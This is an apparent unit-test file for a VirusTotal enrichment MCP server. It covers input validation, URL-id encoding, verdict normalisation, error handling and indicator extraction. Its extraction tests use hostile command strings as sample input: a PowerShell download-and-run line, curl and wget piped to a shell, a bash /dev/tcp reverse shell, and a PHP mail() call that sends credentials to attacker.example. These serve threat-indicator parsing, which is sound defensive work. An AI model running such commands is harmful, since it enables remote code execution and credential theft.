"""
Unit tests for the VirusTotal enrichment MCP server.

Scope: the pure, network-free logic - input validation, URL-id encoding,
verdict normalization, error mapping, and the API-key guard. The async tools
themselves (vt_lookup_*) are thin orchestration over these helpers and a live
HTTP call, so they are intentionally out of scope here (no network in tests).
"""

import base64
import json

import httpx
import pytest
import server
from pydantic import ValidationError

# Real empty-input digests at each accepted length.
VALID_MD5 = "d41d8cd98f00b204e9800998ecf8427e"
VALID_SHA1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
VALID_SHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


# --- HashLookupInput -------------------------------------------------------
@pytest.mark.parametrize("digest", [VALID_MD5, VALID_SHA1, VALID_SHA256])
def test_hash_input_accepts_valid_lengths(digest):
    assert server.HashLookupInput(file_hash=digest).file_hash == digest


def test_hash_input_lowercases_and_strips():
    model = server.HashLookupInput(file_hash=f"  {VALID_MD5.upper()}  ")
    assert model.file_hash == VALID_MD5


@pytest.mark.parametrize(
    "bad",
    [
        "abc",  # too short (< 32)
        "a" * 33,  # length not 32/40/64
        "g" * 32,  # right length, non-hex char
        "z" * 64,  # right length, non-hex char
    ],
)
def test_hash_input_rejects_invalid(bad):
    with pytest.raises(ValidationError):
        server.HashLookupInput(file_hash=bad)


def test_hash_input_forbids_extra_fields():
    with pytest.raises(ValidationError):
        server.HashLookupInput(file_hash=VALID_MD5, sneaky="x")


# --- UrlLookupInput --------------------------------------------------------
def test_url_input_accepts_valid():
    url = "http://192.0.2.10/stage2.ps1"
    assert server.UrlLookupInput(url=url).url == url


def test_url_input_accepts_https():
    url = "https://192.0.2.10/stage2.ps1"
    assert server.UrlLookupInput(url=url).url == url


@pytest.mark.parametrize("bad", ["abc", "http://" + "a" * 2048])
def test_url_input_rejects_out_of_bounds(bad):
    with pytest.raises(ValidationError):
        server.UrlLookupInput(url=bad)


@pytest.mark.parametrize("bad", ["ftp://example.com/payload", "www.example.com/path"])
def test_url_input_rejects_missing_scheme(bad):
    with pytest.raises(ValidationError):
        server.UrlLookupInput(url=bad)


def test_url_input_forbids_extra_fields():
    with pytest.raises(ValidationError):
        server.UrlLookupInput(url="http://example.com", sneaky="x")


# --- IpLookupInput ---------------------------------------------------------
def test_ip_input_accepts_and_strips():
    assert server.IpLookupInput(ip="  192.0.2.44  ").ip == "192.0.2.44"


@pytest.mark.parametrize("bad", ["999.1.1.1", "192.0.2", "not.an.ip", "::1"])
def test_ip_input_rejects_invalid(bad):
    with pytest.raises(ValidationError):
        server.IpLookupInput(ip=bad)


def test_ip_input_forbids_extra_fields():
    with pytest.raises(ValidationError):
        server.IpLookupInput(ip="192.0.2.44", sneaky="x")


# --- DomainLookupInput -----------------------------------------------------
def test_domain_input_accepts_and_lowercases():
    assert server.DomainLookupInput(domain="API.Telegram.ORG").domain == "api.telegram.org"


@pytest.mark.parametrize("bad", ["192.0.2.5", "nodot", "bad_underscore.com", "-bad.com"])
def test_domain_input_rejects_invalid(bad):
    with pytest.raises(ValidationError):
        server.DomainLookupInput(domain=bad)


def test_domain_input_forbids_extra_fields():
    with pytest.raises(ValidationError):
        server.DomainLookupInput(domain="api.telegram.org", sneaky="x")


# --- _url_id (base64url, padding stripped) ---------------------------------
def test_url_id_matches_known_vt_value():
    # VirusTotal's documented URL identifier for this URL.
    assert server._url_id("http://www.google.com/") == "aHR0cDovL3d3dy5nb29nbGUuY29tLw"


def test_url_id_has_no_padding():
    assert "=" not in server._url_id("http://192.0.2.10/x?a=1&b=2")


def test_url_id_roundtrips():
    url = "http://192.0.2.10/very/long/path?with=query&and=more"
    encoded = server._url_id(url)
    padded = encoded + "=" * (-len(encoded) % 4)
    assert base64.urlsafe_b64decode(padded).decode() == url


# --- _normalize ------------------------------------------------------------
def test_normalize_full_attributes():
    attrs = {
        "last_analysis_stats": {
            "malicious": 3,
            "suspicious": 1,
            "harmless": 60,
            "undetected": 5,
        },
        "last_analysis_results": {
            "EngineB": {"category": "harmless"},
            "EngineA": {"category": "malicious"},
            "EngineC": {"category": "suspicious"},
        },
        "reputation": -7,
    }
    out = json.loads(server._normalize("ind", "file", "GID", attrs))

    assert out["indicator"] == "ind"
    assert out["type"] == "file"
    assert out["malicious"] == 3
    assert out["suspicious"] == 1
    assert out["harmless"] == 60
    assert out["undetected"] == 5
    assert out["reputation"] == -7
    # only malicious/suspicious engines, sorted alphabetically
    assert out["flagged_by"] == ["EngineA", "EngineC"]
    assert out["permalink"] == "https://www.virustotal.com/gui/file/GID"


def test_normalize_caps_flagged_at_five():
    results = {f"E{i:02d}": {"category": "malicious"} for i in range(10)}
    out = json.loads(server._normalize("ind", "url", "GID", {"last_analysis_results": results}))
    assert out["flagged_by"] == ["E00", "E01", "E02", "E03", "E04"]


def test_normalize_handles_missing_fields():
    out = json.loads(server._normalize("ind", "file", "GID", {}))
    assert out["malicious"] == 0
    assert out["suspicious"] == 0
    assert out["harmless"] == 0
    assert out["undetected"] == 0
    assert out["reputation"] is None
    assert out["flagged_by"] == []


def test_normalize_tolerates_none_values():
    # VT can return null for stats/results, and individual engine entries.
    attrs = {
        "last_analysis_stats": None,
        "last_analysis_results": {"EngineA": None, "EngineB": {"category": "malicious"}},
    }
    out = json.loads(server._normalize("ind", "file", "GID", attrs))
    assert out["malicious"] == 0
    assert out["flagged_by"] == ["EngineB"]


# --- _handle_error ---------------------------------------------------------
def _status_error(code):
    request = httpx.Request("GET", "https://www.virustotal.com/api/v3/files/x")
    response = httpx.Response(code, request=request)
    return httpx.HTTPStatusError(f"HTTP {code}", request=request, response=response)


@pytest.mark.parametrize(
    ("code", "needle"),
    [
        (404, "Not found"),
        (401, "rejected the API key"),
        (429, "rate limit"),
        (500, "HTTP 500"),
    ],
)
def test_handle_error_http_status(code, needle):
    assert needle in server._handle_error(_status_error(code), "IND")


def test_handle_error_timeout():
    assert "timed out" in server._handle_error(httpx.TimeoutException("slow"), "IND")


def test_handle_error_request_error():
    assert "network error" in server._handle_error(httpx.ConnectError("no route"), "IND")


def test_handle_error_generic_includes_indicator():
    msg = server._handle_error(ValueError("boom"), "IND")
    assert "unexpected" in msg
    assert "IND" in msg


# --- _require_key ----------------------------------------------------------
def test_require_key_missing(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "")
    msg = server._require_key()
    assert msg is not None
    assert "VT_API_KEY is not set" in msg


def test_require_key_present(monkeypatch):
    monkeypatch.setattr(server, "VT_API_KEY", "deadbeef")
    assert server._require_key() is None


# --- _extract_indicators ---------------------------------------------------
def test_extract_url_host_not_double_counted():
    text = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1')"
    assert server._extract_indicators(text) == [
        {"indicator": "http://192.0.2.10/stage2.ps1", "type": "url"}
    ]


def test_extract_dedups_same_url():
    text = "curl http://192.0.2.77/x | bash\nwget http://192.0.2.77/x | sh"
    assert server._extract_indicators(text) == [{"indicator": "http://192.0.2.77/x", "type": "url"}]


@pytest.mark.parametrize(
    ("text", "url"),
    [
        # no-space pipe-to-shell (the corpus obfuscated variants): the pipe is shell
        # syntax, not part of the URL -- extraction must stop at it.
        ("curl -fsSL https://192.0.2.88/x|bash", "https://192.0.2.88/x"),
        ("wget -qO- https://get.example.org/install.sh|sh", "https://get.example.org/install.sh"),
    ],
)
def test_extract_url_stops_at_shell_pipe(text, url):
    assert server._extract_indicators(text) == [{"indicator": url, "type": "url"}]


def test_extract_bare_ip_with_port():
    # /dev/tcp host -- bare IP, and the IPv4 match must not absorb the :port.
    assert server._extract_indicators("bash -i >& /dev/tcp/192.0.2.44/4444 0>&1") == [
        {"indicator": "192.0.2.44", "type": "ip_address"}
    ]


def test_extract_email_domain():
    inds = server._extract_indicators('mail("collector@attacker.example", "creds", $b);')
    assert {"indicator": "attacker.example", "type": "domain"} in inds


def test_extract_ignores_hashes_and_code_identifiers():
    # 32-hex hash + dotted code identifier -> neither is an indicator.
    text = "h = d41d8cd98f00b204e9800998ecf8427e ; obj = System.Net.WebClient"
    assert server._extract_indicators(text) == []


def test_extract_no_indicators():
    assert server._extract_indicators("just some plain prose, nothing to see") == []


def test_extract_orders_url_then_ip_then_domain():
    text = "see admin@evil.example and 192.0.2.9 and http://192.0.2.1/x"
    types = [d["type"] for d in server._extract_indicators(text)]
    assert types == ["url", "ip_address", "domain"]


def test_extract_case_insensitive_url_dedup():
    inds = server._extract_indicators("HTTP://192.0.2.1/A\nhttp://192.0.2.1/A")
    assert len(inds) == 1
    assert inds[0]["type"] == "url"


def test_extract_url_stops_at_prose_paren():
    # Prose-wrapped URL -- extraction must stop at the closing ")".
    assert server._extract_indicators("(see http://192.0.2.9/a)") == [
        {"indicator": "http://192.0.2.9/a", "type": "url"}
    ]


def test_extract_url_truncates_at_path_bracket():
    # A literal "]" in a path ends the match early -- the documented accepted cost
    # of excluding closing brackets so prose/code-wrapped URLs terminate cleanly.
    assert server._extract_indicators("http://192.0.2.9/items[0] rest") == [
        {"indicator": "http://192.0.2.9/items[0", "type": "url"}
    ]
